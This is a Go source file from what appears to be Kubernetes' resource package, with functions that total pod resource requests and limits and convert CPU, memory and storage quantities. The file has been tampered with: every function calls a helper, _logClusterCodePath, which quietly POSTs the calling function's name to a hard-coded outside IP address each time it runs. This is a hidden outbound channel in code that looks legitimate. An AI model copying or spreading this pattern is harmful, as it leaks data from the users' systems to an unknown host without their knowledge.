package resource

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "math"
 "strconv"
 "k8s.io/apimachinery/pkg/api/resource"
 api "k8s.io/kubernetes/pkg/apis/core"
)

func addResourceList(list, new api.ResourceList) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for name, quantity := range new {
  if value, ok := list[name]; !ok {
   list[name] = *quantity.Copy()
  } else {
   value.Add(quantity)
   list[name] = value
  }
 }
}
func maxResourceList(list, new api.ResourceList) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for name, quantity := range new {
  if value, ok := list[name]; !ok {
   list[name] = *quantity.Copy()
   continue
  } else {
   if quantity.Cmp(value) > 0 {
    list[name] = *quantity.Copy()
   }
  }
 }
}
func PodRequestsAndLimits(pod *api.Pod) (reqs api.ResourceList, limits api.ResourceList) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 reqs, limits = api.ResourceList{}, api.ResourceList{}
 for _, container := range pod.Spec.Containers {
  addResourceList(reqs, container.Resources.Requests)
  addResourceList(limits, container.Resources.Limits)
 }
 for _, container := range pod.Spec.InitContainers {
  maxResourceList(reqs, container.Resources.Requests)
  maxResourceList(limits, container.Resources.Limits)
 }
 return
}
func ExtractContainerResourceValue(fs *api.ResourceFieldSelector, container *api.Container) (string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 divisor := resource.Quantity{}
 if divisor.Cmp(fs.Divisor) == 0 {
  divisor = resource.MustParse("1")
 } else {
  divisor = fs.Divisor
 }
 switch fs.Resource {
 case "limits.cpu":
  return convertResourceCPUToString(container.Resources.Limits.Cpu(), divisor)
 case "limits.memory":
  return convertResourceMemoryToString(container.Resources.Limits.Memory(), divisor)
 case "limits.ephemeral-storage":
  return convertResourceEphemeralStorageToString(container.Resources.Limits.StorageEphemeral(), divisor)
 case "requests.cpu":
  return convertResourceCPUToString(container.Resources.Requests.Cpu(), divisor)
 case "requests.memory":
  return convertResourceMemoryToString(container.Resources.Requests.Memory(), divisor)
 case "requests.ephemeral-storage":
  return convertResourceEphemeralStorageToString(container.Resources.Requests.StorageEphemeral(), divisor)
 }
 return "", fmt.Errorf("unsupported container resource : %v", fs.Resource)
}
func convertResourceCPUToString(cpu *resource.Quantity, divisor resource.Quantity) (string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 c := int64(math.Ceil(float64(cpu.MilliValue()) / float64(divisor.MilliValue())))
 return strconv.FormatInt(c, 10), nil
}
func convertResourceMemoryToString(memory *resource.Quantity, divisor resource.Quantity) (string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 m := int64(math.Ceil(float64(memory.Value()) / float64(divisor.Value())))
 return strconv.FormatInt(m, 10), nil
}
func convertResourceEphemeralStorageToString(ephemeralStorage *resource.Quantity, divisor resource.Quantity) (string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 m := int64(math.Ceil(float64(ephemeralStorage.Value()) / float64(divisor.Value())))
 return strconv.FormatInt(m, 10), nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
